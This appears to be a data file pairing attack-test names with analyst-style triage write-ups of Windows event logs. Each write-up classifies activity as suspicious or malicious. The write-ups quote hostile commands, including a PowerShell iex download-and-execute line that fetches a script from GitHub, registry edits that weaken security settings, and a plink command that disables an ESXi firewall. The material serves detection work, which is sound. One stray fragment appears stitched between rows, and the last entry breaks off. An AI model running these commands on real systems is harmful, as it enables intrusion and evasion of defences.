Disable Windows Prefetch Through Registry,"Upon analyzing the provided Windows event logs, I identified the following activity, which may indicate potential suspicious behavior:

- **Time Synchronization Events**: Multiple time synchronization events (Event ID 1 in the Kernel-General logs and Event ID 4616 in the Security logs) occurred within a very short time span. While time synchronization is common, repeated and precise time synchronization with minor adjustments could be an indicator of tampering or preparation for activities that require precise timing, such as scheduled tasks or log alteration.

- **Process Execution**: The logs show numerous executions of the `wevtutil.exe` and `conhost.exe` programs by the user ""SERVER002\admin_test"". While `conhost.exe` is a legitimate Windows process, and `wevtutil.exe` can be used for managing Windows event logs, their multiple and rapid executions might suggest attempts to manipulate or extract logs.

- **Command-Line Arguments**: A critical entry is found with `cmd.exe` running the command to add a registry key: `""cmd.exe"" /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f`. Modifying the `EnablePrefetcher` registry value can be indicative of an attempt to disable prefetching, which might be an effort to optimize or prepare the system for some automated process, potentially suspicious.

- **Registry Modification**: The execution of `reg.exe` confirms the registry modification attempt, further solidifying its potential significance.

Overall, the combination of these behaviors—especially the registry modifications, the peculiar process activity, and the time synchronization events—could suggest preparatory actions for either non-standard configurations or broader unauthorized activities. However, these activities alone do not definitively confirm malicious intent, as they could be part of legitimate administrative tasks or misconfigurations.

**Recommendation**:
Given the information above, it is prudent to classify the activity as **SUSPICIOUS**. I recommend a more in-depth analysis that includes:
1. Checking for any recent changes in user accounts, particularly ""admin_test"", to ensure it's being used legitimately.
2. Reviewing the system for other signs of unauthorized access or lateral movement.
3. Correlating these activities with any other network anomalies or alerts from intrusion detection systems.
4. Monitoring this host closely for further anomalies or unusual behavior.

Immediate remediation steps should include:
- Verifying the legitimacy of the user actions associated with ""admin_test"".
- Reviewing the modified registry setting to determine if it aligns with corporate policies and practices.
- Consider running antivirus and antimalware scans for any indicators of compromise."
Rundll32 syssetup.dll Execution,"Upon reviewing the provided Sysmon logs, here are my observations and conclusions:

### Observations:
1. **Frequent Execution of Known System Utilities:**
   - **powershell.exe, conhost.exe, wevtutil.exe, hostname.exe, whoami.exe, cmd.exe, rundll32.exe, WmiPrvSE.exe, and svchost.exe** are frequently executed.
   - These executables are legitimate Windows system utilities.

2. **Execution Context and User:**
   - The processes are executed under the user `SERVER002\admin_test`, with high integrity levels indicating that they were run with administrative privileges.
   - Specific processes like `wbem\WmiPrvSE.exe` and `svchost.exe` are executed under `NT AUTHORITY\SYSTEM`, which is standard for those services.

3. **Command-Line Arguments:**
   - Notably, `cmd.exe` is executed with `rundll32.exe syssetup.dll,SetupInfObjectInstallAction` via the command line.
   - This command appears to execute an INF file under a temporary directory, which is unusual for standard operations, particularly as it involves administrative actions potentially set up for persistence or malicious configurations via the downloaded INF file.

4. **Integrity Levels and Hashes:**
   - Execution integrity levels are high, confirming administrative-level execution.
   - The process hashes provided do not clearly indicate any known signatures of malicious software; however, this doesn't preclude subversion of these tools for malicious purposes.

### Potential Risks:
- **Suspicion Around the INF Execution:**
  - The execution of `rundll32.exe` with an installation action involving a temporary INF file is unusual and raises suspicion. This behavior might indicate an attempt to execute or configure something without clear transparency, which could be indicative of malicious activity or misconfiguration by an admin or tool.
- **Admin User Activities:**
  - The concentration of activities executed under the admin account (`SERVER002\admin_test`) suggests possible unauthorized administrative activities but may require corroborating evidence to declare malicious intent.

### Conclusion and Guidance:
**SUSPICIOUS:**
The logs do not outright confirm malicious activity but do contain suspicious patterns like the execution of system utilities in a sequence that could suggest lateral movement or misconfiguration. The command executed through `rundll32.exe` with an INF file installation should be particularly scrutinized, as this action does not align with typical administrative tasks.

### Recommended Next Steps:
1. **Further Investigation of INF File:**
   - Validate the contents and purpose of the `data.011_DefaultInstall.inf` file. Ensure it doesn't include harmful directives or configurations.
2. **User Activity Monitoring:**
   - Review other logs (security, system, etc., if available) to cross-reference any unusual activity from `SERVER002\admin_test`.
3. **Integrity of Executables:**
   - Verify the integrity of system utilities involved by comparing hashes against known values in a trusted database to rule out tampering.
4. **Security Baseline Check:**
   - Evaluate if these activities align with normal administrative operations on `Server002` or if it deviates from the baseline.

Without a definitive malicious signature or behavior, increased scrutiny and investigation into both the executing user and commands are needed to ensure system integrity."
Modify UseTPMKeyPIN Registry entry,"## Detailed Analysis

### Overview
The logs provided are from a Windows host named `Server002`. They comprise entries from Security logs, Application logs, System logs, Sysmon logs, and, although stated, no Windows PowerShell logs were visible. The focus here is to determine any potentially malicious activity based on abnormal behaviors seen in these logs.

### Suspicious or Anomalous Behavior

1. **Time Changes in Security and System Logs**: 
   - Multiple entries in the Security log with EventID 4616 indicate changes to system time: previous (`2024-10-24 20:09:38.7261453`) to new (`2024-10-24 20:09:36.6465532`). Such time adjustments can be a tactic to manipulate logs and timestamps, potentially to disguise malicious activity.
   - The corresponding System log entries (Kernel-General EventID 1) confirm these time changes. The ProcessName associated with these changes is `svchost.exe`, a legitimate Windows process, but often targeted by malicious actors to hide malicious payloads.

2. **Frequent Execution of Wevtutil and Conhost**:
   - Sysmon logs show the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` multiple times within a short window.
   - `wevtutil.exe` is a command-line utility to manage Windows Event logs. Frequent use could be an attempt to clear or manipulate event logs.
   - `conhost.exe` serves as a console window host and can be utilized for various purposes; regular execution isn't inherently suspicious unless correlated with suspicious activities.

3. **Use of CMD and REG Commands**:
   - Sysmon logs document the execution of `cmd.exe` to run a `reg add` command under the context of the user `SERVER002\admin_test`. The command modifies a registry key under `HKLM\SOFTWARE\Policies\Microsoft\FVE`, typically related to security features like BitLocker. Unauthorized registry changes could be an indicator of a potential compromise.
  
4. **Execution of Edge Update Processes**:
   - Multiple entries involving `MicrosoftEdgeUpdate.exe` and related modules are evident. While executing Edge Update processes is not inherently malicious, the volume of entries over a clustered timeframe could suggest something more than just routine updates.

### Assessment and Risk Identification

- **Indicators of Possible Malicious Activity**:
  - Repeated time changes, especially given the alignment with known legitimate processes like `svchost.exe`, could indicate an attempt to obscure malicious activity.
  - The manipulation attempt of `HKLM\SOFTWARE\Policies\Microsoft\FVE` registry key via CMD might be an attempt to alter system security configurations like BitLocker settings, which is suspicious.
  - Heavy usage of `wevtutil.exe` might indicate log tampering.

### Guidance and Next Steps

Based on the analysis, this activity shows several signs that go beyond typical benign operations:

1. **Immediate Recommendations**:
   - **Investigate Time Changes**: Confirm whether these changes were authorized. It would be crucial to determine if these time change actions align with any scheduled maintenance or known administrative tasks.
   - **Review User Activity**: Verify the actions of `admin_test` and check whether their behavior aligns with authorized activity or if credentials could be compromised.
   - **Inspect `reg add` Command Execution**: Validate if there’s any business requirement for altering the `UseTPMKeyPIN` registry key or if it can be linked to an unauthorized configuration change attempt.

2. **Further Monitoring and Investigation**:
   - Continue monitoring for any additional suspicious or unauthorized changes, especially around the system time and registry.
   - Employ tools to examine any potential network anomalies linked to the suspicious activities detected here.

### Resolution

Based on the investigation above, I classify this incident as **SUSPICIOUS**. There are several indications of potential malicious activity, but more context and investigation are necessary to conclude definitively. Further analysis and context (if available) might turn the assessment towards benign, but for now, more scrutiny is required."
MSBuild Bypass Using Inline Tasks (VB),"## Detailed Analysis:

### Suspicious or Anomalous Behavior:

1. **Windows PowerShell Execution**:
   - The execution of `powershell.exe` without accompanying command-line arguments is peculiar, especially since `PowerShell` can be a potent tool for both legitimate administrative tasks and unauthorized malicious activities. Such execution could potentially be indicative of script-kiddies or an ongoing malicious attempt trying to leverage `PowerShell` for unauthorized access or tasks.
   
2. **Usage of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` (Windows Event Log Utility) are being executed. While this utility is often used by administrators for maintenance tasks like clearing event logs, its frequent execution could signify an attempt to cover tracks in a potential incident of compromise.

3. **CMD and MSBuild Activity**:
   - The execution of `cmd.exe` to run `MSBuild.exe`, which further executes Visual Basic and compiler tools (vbc.exe and cvtres.exe) from temporary directories, tends to be associated with fileless malware techniques or living-off-the-land (LotL) scenarios. This could be indicative of an attacker building or compiling malicious payloads directly on the host system without leaving permanent traces on disk.
   
4. **Processes Executed Under Same User**:
   - The majority of the logged executions are linked under the same user, ""SERVER002\admin_test,"" which might indicate either an insider threat or an external party having obtained the credentials of an account with administrative privileges.

5. **System Commands with High Integrity Level**:
   - Several routine system utilities (e.g., `whoami.exe`, `cmd.exe`, and `taskhostw.exe`) executed with high integrity can suggest privilege escalation activities or attempts to maintain persistence or conduct reconnaissance operations within the target environment.

6. **Microsoft Edge Updates**:
   - The logs indicate activities related to `MicrosoftEdgeUpdate.exe`. This can be part of a legitimate update process, but if interspersed with suspicious actions, such activities could entwine with malware masquerading as updates.

### Potential Malicious Activities & Compromise:

- **Living-off-the-Land Binaries and Scripts (LOLBAS)**: Many of the actions resemble the hallmark of a LOLBAS technique. The execution flow depicted in logs, which includes the usage of built-in Windows utilities, suggests possible evasion, credential theft, or data exfiltration activities.

- **Persistence Mechanism**:
  - Tools like `taskhostw.exe` and `DeviceCensus.exe` might be exploited to set persistent procedures masked as legitimate processes.

- **Privilege Escalation & Credential Dumps**:
  - The combination of executables used with specified command lines gives a glimpse into potential attempts for privilege escalation or reconnaissance to map out the network or facilitating lateral movement.

### Assessment and Resolution:

Upon reviewing the activity patterns and considering the noted processes running at high integrity levels under an administrative account, there is enough evidence to raise concern. The use of the `PowerShell` and `MSBuild.exe` in conjunction with temporary directories hints toward suspicious or potentially malicious activities that warrant further investigation to confirm any signs of compromise.

### Resolution:

- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate Investigation**:
   - Perform a thorough forensic analysis on the system in question. Specifically focus on analyzing the context and outputs of `powershell.exe` and associated temporary files.
   
2. **Log Analysis & Activity Tracing**:
   - Further investigate the sequences where `wevtutil.exe` was initiated. Consider determining what log data might have been accessed or altered to understand any obfuscation techniques used by potential attackers.

3. **Credential Exposure Review**:
   - Check if `SERVER002\admin_test` credentials were compromised. Reevaluate their privileges and ensure it is in compliance with the principle of least privilege.

4. **Network and Endpoint Monitoring**:
   - Enable heightened logging and monitoring for this and other systems. Proactively look for similar activities across the infrastructure.

5. **Security Controls Assessment**:
   - Review and tighten security controls and configurations, particularly around the execution of scripts and administrative tools on the network

6. **Employee Awareness**:
   - Conduct user training or alerts to help detect any additional phishing or social engineering tactics that may have compromised the `admin_test` account originally."
Disable Windows Shutdown Button,"Upon analyzing the provided log entries, several events and details stand out that suggest potentially suspicious or malicious activity.

### Key Observations:

1. **Time Change Events:**
   - Multiple Event ID 4616 from the Security log indicating a system time change. The time change (`NewTime` earlier than `PreviousTime`) can be indicative of attempts to obscure malicious activity or tamper with logs.

2. **Privilege Use:**
   - The Security log Event ID 4672 indicates the use of special privileges by the user `admin_test`. This includes `SeDebugPrivilege` and others which are typically associated with administrative or elevated tasks that could be exploited maliciously.

3. **Processes and Actions of Interest:**
   - The use of `wevtutil.exe` and `conhost.exe` by the user `admin_test` could indicate attempts to manipulate or query Windows Event Logs.
   - The process `cmd.exe` executed a registry command to alter `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System`, specifically `shutdownwithoutlogon`, which is an unusual modification that could indicate an attempt to change system policies to benefit malicious actors.

4. **Integrity Level and Execution:**
   - The Sysmon logs show the process `cmd.exe` executing with a high integrity level, signifying elevated privileges used for potentially altering system settings which is not common in typical user activity unless legitimate administrative tasks are being carried out.
   - The process lineage shows command executions leading from system-related executables (`wsmprovhost.exe` -> `cmd.exe` -> `reg.exe`), often involved in script-based automation or malicious activities.

5. **Network Service Usage:**
   - Event ID 4624 in the Security log indicates a network logon (LogonType 3) for the `admin_test` user through NTLM authentication, which is typical in internal network activity but coupled with privilege usage and registry edits, it becomes more concerning.

6. **System Logs:**
   - The Windows Kernel-General events and Kernel-TimeService events can be considered as corroborating evidence for the time change observed in Security logs. Consistent reasoning for these log events is typically routine, but in context with other entries, they warrant attention.

### Assessment:

Based on the analysis of the logs provided:

- The combination of system time changes, elevated privilege usage, suspicious command-line execution modifying registry entries, and notable process execution suggest the potential for **suspicious activity**. 

- A precise link to an overt attack cannot be definitively concluded without additional context or corroborative investigation, such as network traffic analysis or endpoint behavior monitoring.

### Resolution:

**SUSPICIOUS**: The logs contain activities and behaviors that deviate from standard operational activities and warrant further investigation to rule out potential malicious intent or compromise.

### Guidance for Further Investigation:

- Review additional logs surrounding the timestamps provided to establish a clearer timeline.
- Conduct a thorough review of user `admin_test`'s actions and correlate with intended administrative tasks.
- Investigate any recent updates or configurations that could explain registry changes.
- Monitor network logs for any external (ingress/egress) anomalies corresponding to these events.
- Validate the integrity of critical system files and lookout for unauthorized alterations."
Enable Proxy Settings,"Upon reviewing the provided Windows event logs for indications of malicious activity, I have performed the analysis based on the different types of logs and key indicators of potentially malicious behavior. Here is my detailed analysis:

### Security Logs:
- The events recorded under EventID 4616 with the process ""svchost.exe"" show changes in system time. These are normal operations performed by the service host process (`svchost.exe`) for various Windows services. This in itself isn't indicative of malicious activity.

### Application Logs:
- There is an entry from ""Microsoft-Windows-Security-SPP"" related to the Software Protection Platform Service, which appears to be routine. No anomalies are spotted here.

### System Logs:
- The logs from ""Microsoft-Windows-Kernel-General"" and ""Microsoft-Windows-Time-Service"" around changes in timezone and system time are normal and didn't show any unusual modifications.

### Sysmon Logs:
- A series of `wevtutil.exe` executions (a tool for managing Windows event logs) and `conhost.exe`, which is the Console Windows Host, are seen executed by the user `SERVER002\admin_test`. While these may signal log management, possibly indicating an attempt to manipulate or investigate event logs, it appears benign unless accompanied by context that suggests tampering.
- An event of note is the execution of `cmd.exe` with a command to modify the registry setting for proxy configuration (`HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings`). This indicates a change in network settings via a script or a command-line execution, which can be suspicious without context, especially if unexpected.
- Also noted is normal activity from Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`), executed by a system-level account, which appears legitimate.

### Findings:
The key potentially suspicious activity observed involves the use of `cmd.exe` to alter proxy settings in the registry by the admin test user. This could be a legitimate network configuration change; however, if unexpected, it may warrant further inquiry to ensure these modifications were approved and executed for a legitimate purpose. The execution of `wevtutil.exe` by the same user could also be indicative of log management or manipulation, but it's benign without further evidence.

### Conclusion:
**Resolution: SUSPICIOUS**

The specific event altering the registry proxy settings raises queries about its legitimacy. While most observed activities, including time changes and system operations, seem routine, this particular modification suggests the need for confirmation. It is recommended to verify if such changes were authorized by the IT department or if they align with any ongoing configurations updates. Additionally, ensure that the user `admin_test` has not been compromised or acted outside standard procedures. Further investigation or correlation with other security events would be prudent before clearing this suspicion."
WinPwn - UAC Magic,"### Analysis:

After conducting a thorough analysis of the provided Windows event logs, a few critical observations point towards potential malicious activity:

#### PowerShell Logs:
- **Suspicious Command Execution:** Multiple PowerShell events show the execution of a script via `powershell.exe` with a command that includes downloading and executing content from a GitHub repository:
  ```
  HostApplication=powershell.exe & {$script_repo='https://raw.githubusercontent.com/script'
  iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
  script -noninteractive -command ""C:\\windows\\system32\\cmd.exe"" -technique magic
  ```
  This indicates the execution of a script downloaded from an external source, which is a significant indicator of potential malicious activity.

#### Security Logs:
- **Privilege Escalation:** Multiple events (ID 4672) indicate assignments of special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, and others to a user `admin_test`. These privileges are typically associated with higher than normal permissions which could be used for privilege escalation.

#### Sysmon Logs:
- **Anomalous Process Activity:** The Sysmon logs capture several executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While these applications are not inherently malicious, their execution context in combination with PowerShell activities warrants further investigation. The execution of the `whoami` command also appears in the Sysmon logs which could be used to gather system information by an intruder.
  
- **PowerShell Execution:** The same PowerShell command seen in the Windows PowerShell log (downloading and executing a script) is logged in Sysmon. This reiterates the suspicious nature of the PowerShell activities.

### Indicators of Compromise:
- **External Script Execution:** The act of downloading and executing a script directly from the internet, particularly from a public repository, is a notable red flag.
- **Elevated Privileges:** The assignment of sensitive privileges to a user and subsequent activities associated with those privileges may suggest attempts to compromise the system integrity.
- **Unusual PowerShell Usage:** The type of PowerShell command used, which bypasses standard input/output, aligns with common attack vectors used in PowerShell-based attacks or living-off-the-land techniques.

### Assessment and Recommendation:

Based on the analysis, the activities observed in the logs appear to be **MALICIOUS**. The execution of externally sourced scripts via PowerShell, in conjunction with privileged user modifications and suspect process activity, are clear indicators of a potential compromise.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected system from the network to prevent further potential spread of the compromise.
2. **Conduct Thorough Investigation:**
   - Analyze the downloaded script's content and intent.
   - Review logs for any indicators of lateral movement or data exfiltration.
3. **Privilege Review:**
   - Revoke unnecessary elevated privileges and review user account activities, especially for `admin_test`.
4. **Remediation:**
   - Remove any potentially malicious software or scripts found.
   - Update system and security software to patch any vulnerabilities exploited.
5. **Enhance Monitoring:**
   - Increase logging and monitoring for similar activities across other systems.
   - Implement stricter rules for PowerShell execution and external network communication.

In conclusion, the activity logged supports a strong suspicion of malicious actions on the system in question. Immediate action and further investigation are crucial to securing the environment."
Delete TeamViewer Log Files,"After reviewing the provided Windows event logs across various logs, here is a detailed analysis of the entries:

### PowerShell Logs:
- The PowerShell logs show instances of PowerShell being executed on `Server002` with specific commands:
  - Commands executed: 
    - `New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null`
    - `Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore`
  - These commands create and then immediately delete a temporary log file. While the use of PowerShell for file operations can be normal administrative behavior, creating a file and immediately deleting it is somewhat suspicious and could be indicative of an attempt to hide activities.

### System Logs:
- System logs indicate time adjustments managed by `svchost.exe`, which is typical and part of normal system operations and maintenance, particularly when syncing time with `time.windows.com`.

### Security Logs:
- The security logs mainly document time change events and associations with `svchost.exe`. These entries do not show any privilege escalation or unexpected user activities.

### Application Logs:
- Application logs show typical activities related to the Microsoft Edge update service, indicating routine update processes.

### Sysmon Logs:
- Several process creation events related to processes like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and Microsoft Edge Update executables are logged.
- Notably, we see processes related to Microsoft Edge being updated, which is a common background activity.
- The `whoami.exe` and `conhost.exe` executions also captured seem to correspond with normal operations based on `Sysmon` logging context.
- The repeated presence of Microsoft Edge Update activities appears routine, with no indicators of compromise or misuse.

### Assessment:
- **Suspicious Activity Noted**: The PowerShell activity of creating then removing a temporary log file without an apparent necessity does raise a flag. This behavior can be indicative of scripting used in setups, logging suppression, or parts of a script to test access or environmental variables.
- **No Definite Indicators of Compromise (IOC)**: Other logs such as system, security, and applications do not reveal any clear malicious intent or action that would lead to conclusion definitively as a compromise.

### Resolution:
- **SUSPICIOUS**: The activities identified in the PowerShell log warrant further investigation. The repeated action of creating a file and then immediately deleting it, without further context or documentation, could be part of a benign script or a sign of an early stage of unauthorized activity. Additional scrutiny should be applied to understand why these PowerShell commands were executed and who authorized or scheduled them.
  
#### Recommendation:
1. **Investigate further the PowerShell commands**: Check scheduled tasks, user scripts, or third-party applications utilizing PowerShell or temporary file creation and deletion under the user `admin_test`.
2. **Conduct a wider log search**: Extend the logging timeframe to see if any other activities (especially around this PowerShell activity) surface that were not captured in this snapshot.
3. **Verify the legitimacy**: Engage with system administrators or the hosting team to confirm if such scripts were officially sanctioned and known.
4. **Consider a security review or audit** for users engaging PowerShell scripts or elevated privilege commands frequently."
Abusing MyComputer Disk Backup Path for Persistence,"Upon analyzing the given Windows event logs, several points stand out as potentially suspicious activities that warrant further investigation:

1. **Registry Modification via CMD and REG.exe**:
    - Event Record ID `17978` logs the execution of `cmd.exe` with a command line to add a registry key with `notepad.exe`.
    - Event Record ID `17980` logs the execution of `reg.exe` to perform this registry addition. 
    - This action is particularly suspicious as it involves direct modification of the Windows registry to set `notepad.exe` in a path, which might be leveraged for persistence or privilege escalation if misused.

2. **Time Synchronization Events**:
    - Security Event IDs `30349` and `30350`, alongside System Events `3570` and `3573`, indicate unusual time changes and resynchronizations involving `svchost.exe`.
    - The time was seemingly moved backwards, which can be indicative of an attacker attempting to manipulate event log chronology.

3. **Process Execution Patterns**:
    - The logs consistently show processes like `wevtutil.exe` and `conhost.exe` being executed by `SERVER002\admin_test`. While these applications can have legitimate uses (such as managing Windows events and command-line operations), their rapid sequence without an apparent pattern may indicate misuse.
   
4. **Use of Various Administrative Tools**:
    - The execution of `whoami.exe` and `hostname.exe` (Event Records `17974` and `17970`) under the context of `SERVER002\admin_test` could be legitimate, but their context here paired with the suspicious registry activities might imply recon activities typically seen in malicious actions.

5. **Microsoft Edge Update Exe's**:
    - Multiple executions of Edge Update services and behind-the-scenes communication updates, while they could be legitimate update processes, might also be leveraged by malware for delivery or persistence.
   
Based on the above findings, the conclusion is:

- **Resolution: SUSPICIOUS** - While not definitively malicious, the registry modification, rapid sequence of CLI tools, and odd time adjustments indicate activities that warrant further detailed investigation. It is crucial to ensure no unauthorized or harmful changes have been made to system configurations or registry settings.

**Guidance on How to Proceed**:
- Thoroughly investigate the purpose and origin of the registry key additions and evaluate the source of commands executed by `SERVER002\admin_test`.
- Check for any recent changes in user permissions or group memberships, especially regarding the `admin_test` account.
- Review security patches and update all software to the latest versions to mitigate vulnerabilities.
- Partition off critical systems for detailed monitoring and conduct a full scan for potential threats or anomalies."
Delete Microsoft Defender ASR Rules - GPO,"Upon examining the provided Windows event logs, several observations can be made regarding potential malicious activity indicators:

1. **Time Change Events:**
   - The repeated occurrence of Event ID 4616 in the Security log indicates that the system time was changed. Although the time change logged by the `svchost.exe` process might be legitimate, it is unusual to have rapid consecutive time changes unless there's a synchronization or an issue that needs addressing.
   - Reviewing the events from Microsoft-Windows-Kernel-General with Event ID 1 and Event ID 24 depicts time modifications tracked, which correlate with the Security logs.

2. **PowerShell Execution:**
   - The log entries from the Sysmon log highlight the execution of `powershell.exe` with commands affecting the registry in regards to Windows Defender settings. This operation includes creating a registry entry, setting a value, and then deleting it, which can be indicative of an attempt to evade security controls. Although executing scripts through PowerShell can be benign, the specific commands affecting security settings should be treated with caution.
   - The detailed command in the PowerShell logs also highlights potentially unwanted changes to the system registry, specifically within the Windows Defender Exploit Guard settings. 

3. **Sysmon Activity:**
   - The presence of `wevtutil.exe` and `conhost.exe` processes executed by the user `SERVER002\\admin_test` at various points suggests typical Windows utility usage. However, repetitive usage of `wevtutil.exe`, which is often used for event log management, can also be red-flagged in context with other suspicious indicators.

4. **Other Log Events:**
   - The kernel and service-related events demonstrate routine operations of the system and services, with no overt anomalies detected.

Based on the analysis, the most concerning element is the PowerShell script that modifies and subsequently deletes registry settings related to Windows security features (`ASR\Rules`). This activity and the context in which it was initiated are suspicious, indicating a potential compromise or unauthorized system configuration attempt.

### Assessment:
- **Resolution:** SUSPICIOUS

### Guidance:
- Conduct further investigations to determine the legitimacy of the PowerShell commands executed, specifically focusing on the actions taken by the account `SERVER002\\admin_test`.
- Confirm whether changes to Windows Defender settings were authorized or necessary, and review the associated user’s activity.
- Apply additional monitoring to detect continued or future suspicious PowerShell activity.
- Consider employing enhanced alerting for registry modifications and PowerShell script executions that resemble the analyzed patterns.

The evidence presented does not conclusively prove malicious intent but highly suggests that the activities should warrant further scrutiny to ensure system safety and integrity."

### Other Logs
- **Security and System Logs:**
  - Time adjustments observed, with no direct indication these are related to malicious activity. Such changes could result from system synchronizations or timezone adjustments.

## Assessment
The Windows PowerShell logs display considerable activity aimed at disabling a wide range of Windows Defender protections, which is highly anomalous and suspicious. This directly suggests an attempt to disable defensive measures for possible malicious activities. PowerShell can be a powerful tool for both benign administration and for attackers, hence its activity should be tightly controlled and monitored.

### Resolution: MALICIOUS
The behavior seen in the logs, primarily through PowerShell usage to disable security services, clearly indicates malicious intent. The risks of a compromised system are significant, given that these operations could disable key security features and allow for malware operations to proceed undetected.

## Guidance
- **Immediate Action**: Isolate the affected machine from the network to prevent potential spread or further malicious activity.
- **Thorough Investigation**: Conduct a comprehensive investigation to identify how these changes were initiated, whether through a compromised account or an exploited vulnerability.
- **Restore Defenses**: Re-enable all the disabled Windows Defender settings and policies as soon as possible.
- **System Forensics**: Capture and analyze the current state, including running processes, network connections, and memory images for further forensic investigation.

By addressing the situation promptly and effectively, the potential spread and impact of any malicious activities can be minimized."
ESXi - Disable Firewall via Esxcli,"Based on the provided Windows event logs for analysis, the assessment indicates potential suspicious activity due to the following observations:

1. **Unusual Process Execution**:
   - There are several instances of `powershell.exe` execution along with `conhost.exe`. While `conhost.exe` typically runs alongside console applications, frequent and numerous executions in rapid sequence can be indicative of script or batch process automation.
   - The use of `wevtutil.exe` and `whoami.exe` in quick succession, along with their execution by the `admin_test` user, may indicate a user is querying system logs or retrieving user information, potentially for reconnaissance purposes.

2. **Command-line Arguments**:
   - A critical event to note is the execution of `cmd.exe` using `plink.exe` with arguments that suggest SSH connections potentially altering an ESXi server's firewall settings. This command: `""cmd.exe"" /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\plink.exe -ssh file.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\files\\data.004\\src\\esxi_disable_firewall.txt` appears to automate SSH access and manipulate firewall settings, which could be an indicator of a malicious attempt to disable security controls.

3. **Use of Administrative Credentials**:
   - The consistent use of administrative credentials (`SERVER002\\admin_test`) across these tasks indicates an elevated access level being leveraged for executing potential unauthorized actions.

4. **Presence of Software Update Activity**:
   - A series of logs related to `MicrosoftEdgeUpdate.exe` processes suggest that updates were being processed. However, these are consistent with typical system operations and marked by a corresponding ""Service stopped"" entry in the Application log.

Given the above findings, the situation suggests activity that requires further investigation to confirm the intent and impact. The execution of remote shell commands that appear to modify firewall settings and the unusual pattern of command-line argument usage are the most significant indicators of potential abuse.

**Resolution**
- **SUSPICIOUS**: The logs contain activities that necessitate a more extensive investigation, particularly focusing on the `plink.exe` command usage and the context behind the PowerShell and system command executions. The root cause analysis should focus on why these operations were initiated, who initiated them, and whether these activities align with known and approved administrative actions.

**Guidance**: 
- Conduct immediate review and threat-hunting activities focusing on the origin IPs accessing the system, if available, especially associated with the SSH activity.
- Interview the user/account holder (admin_test) for legitimacy confirmation of actions.
- Scrutinize firewall and network logs correlated by the timestamps in these logs for any outbound connections or anomalies.
- Conduct integrity checks on the external files referenced in command-line arguments for detection of unauthorized modifications."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"Based on the analysis of the provided Windows event logs, here's the breakdown of potentially suspicious or malicious activity:

### Observations:
1. **PowerShell Activity**:
   - A PowerShell process (`powershell.exe`) execution is noted. While PowerShell usage can be legitimate, it is often used in attacks for various purposes such as downloading payloads or executing scripts. The entry does not provide specific command-line details, so it is difficult to gauge intent from this alone.

2. **Use of `cmd.exe` installing `.msi`**:
   - An instance of `cmd.exe` execution with the command line invoking `msiexec` to install a file located in a user's local Temp directory, which can be indicative of suspicious behavior, especially with a relatively generic file name such as `data.007_EXE.msi`.
   - Temporary directories being used to run/install software might indicate an attempt to execute unwanted software, especially if the path or file names are unusual or align with known malicious activities.

3. **Unknown Executable**:
   - Execution of a file `MSIA30E.tmp`, which does not have a standard description or company name, suggests a loosely controlled or unverified running executable. Since it is executing from the Windows Installer directory, this might be concerning.

4. **Common Windows Processes: `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `HOSTNAME.EXE`**:
   - These processes seem legitimate on the surface. However, their execution patterns grouped closely in time, especially involving interaction with event utilities (`wevtutil.exe`), can suggest log manipulation attempts or system information gathering if not initiated by valid administrative tasks.

5. **Microsoft Edge Update**:
   - The presence of entries related to Microsoft Edge updating (`MicrosoftEdgeUpdate.exe` and `setup.exe`) align with legitimate browser update behavior. This is generally benign assuming Microsoft Edge is expected to be installed and managed on this system.

### Conclusion:
Given the combination of events – notably the `powershell.exe` process execution, the installation of an `.msi` file from a Temporary directory, and execution of a potentially untrusted file (`MSIA30E.tmp`) – there's a plausible reason to suspect malicious activity or at least unwanted changes being applied to the system.

### Resolution:
- **SUSPICIOUS**: The activities observed in the logs, such as the pattern of executable launches, especially involving standard tools from atypical locations, suggest activities that are out of the ordinary for regular operation or administrative activities without more context.
  
### Recommendations:
- **Further Investigation**:
  - Review the detailed command-line arguments used by the `powershell.exe` and `.cmd.exe`.
  - Verify the source and integrity of `data.007_EXE.msi` and any associated files.
  - Investigate user `admin_test` activities around the timestamp in question to confirm whether actions were authorized.
  - Consider running an antivirus or malware scan on the host for potential compromise.
- **Monitoring**:
  - Set up monitoring and alerts on PowerShell script execution and changes in temporary directories.
  - Enable advanced logging to capture command-line details for subsequent processes in the future.

These follow-up actions will provide more clarity on whether these activities denote true malicious intent or if they are false positives."
Azure - Eventhub Deletion,"Upon closely analyzing the provided Windows event logs from ""Server002,"" here's a detailed assessment:

### Observations from the Logs

#### Windows PowerShell Logs:
- **Activity Observed:** There is a PowerShell command executed with the following syntax:
  ```
  powershell.exe & {$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force
  $creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
  Connect-AzureAD -Credential $creds
  Remove-AzEventHub -ResourceGroupName -Namespace -Name test_eventhub}
  ```
- **Concerns:** 
  - The PowerShell command sets a secure password, creates credentials, connects to Azure Active Directory, and attempts to remove an Azure Event Hub named `test_eventhub`. 
  - The use of empty string for credentials (`""""`) could indicate a script execution error or an attempt to mask the operations.
  - The removal of an Azure resource without clear authorization or auditing can be a red flag for potential malicious intent.

#### Sysmon Logs:
- **PowerShell Execution Evidence:** The Sysmon logs confirm the execution of `powershell.exe` by the user `SERVER002\admin_test`, consistent with the PowerShell logs.
